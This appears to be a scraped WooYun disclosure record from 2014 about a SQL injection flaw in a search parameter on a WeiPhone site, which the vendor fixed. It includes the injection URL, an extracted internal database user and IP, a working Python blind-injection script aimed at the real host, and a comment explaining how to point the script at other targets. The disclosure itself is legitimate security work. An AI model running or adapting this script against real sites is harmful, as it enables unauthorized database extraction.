{"id": 49054, "wybug_id": "wooyun-2014-086372", "wybug_title": "威锋网某站点MySQL注射(附验证脚本)", "wybug_corp": "weiphone", "wybug_author": "lijiejie", "wybug_date": "2014-12-08 14:42", "wybug_open_date": "2014-12-08 17:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 威锋网某站点MySQL注射(附验证脚本) 详细说明：  注入点：\nhttp://s.feng.com/f?srchendtime=1&srchgroupid=0&srchmod=news\" AND (select length(user()) from dual)=20 AND \"123\"=\"123&srchrange=5&srchsort=1&srchstarttime=1&srchtxt=360&srchuid=0&srchuser=lcjoruor\n参数srchmod可注入。   漏洞证明：  猜解user(),得到：\natlas@192.168.199.73\n\n\n验证脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print 'start to retrive MySQL user:'user = ''for i in range(1,21):    for payload in payloads:        conn = httplib.HTTPConnection('s.feng.com', timeout=60)        url = '/f?srchendtime=1&srchgroupid=0&srchrange=5&srchsort=1&srchstarttime=1&srchtxt=360&srchuid=0&srchuser=lcjoruor&srchmod='        s = 'news\" AND ascii(mid(lower(user())from(%s)for(1)))=%s AND \"123\"=\"123' % (i, ord(payload))        conn.request(method='GET',                     url=url+urllib.quote(s),                     headers=headers)        html_doc = conn.getresponse().read().decode('utf-8')        if html_doc.find(u'搜索时间</dl>') > 0:            user += payload            print '\\n[in progress]', user            break        else:            print '.',print '\\nMySQL user is', user\n   修复方案：  参数过滤和转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-08 15:28 厂商回复： 谢谢，我们尽快修复。 最新状态： 2014-12-08：已经修复，谢谢提醒。  ", "replys": "漏洞评价：\n评论\n     2014-12-08 15:59 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  好厉害。    \n     2014-12-08 16:15 |    \t\tWoodee \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云路人甲，打脸pa pa pa)\t\t \n  20分，碉堡    \n     2014-12-09 09:38 |    \t\t码农 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 爱肉肉~)\t\t \n  厉害~    \n     2014-12-09 13:58 |    \t\thack雪花 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:18        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  这脚本怎么用    \n     2014-12-12 16:40 |    \t\tflywin \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | 有好的安卓或者IOS远程控制的请联系我，RMB...)\t\t \n  这么叼    \n     2015-01-13 18:05 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @hack雪花 python 11.pyconn = httplib.HTTPConnection('s.feng.com', timeout=60)        url = '/f?srchendtime=1&srchgroupid=0&srchrange=5&srchsort=1&srchstarttime=1&srchtxt=360&srchuid=0&srchuser=lcjoruor&srchmod='这里对应的地方换掉就可以了    \n     2015-01-13 18:05 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  楼主，这个不能用sqlmap跑吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}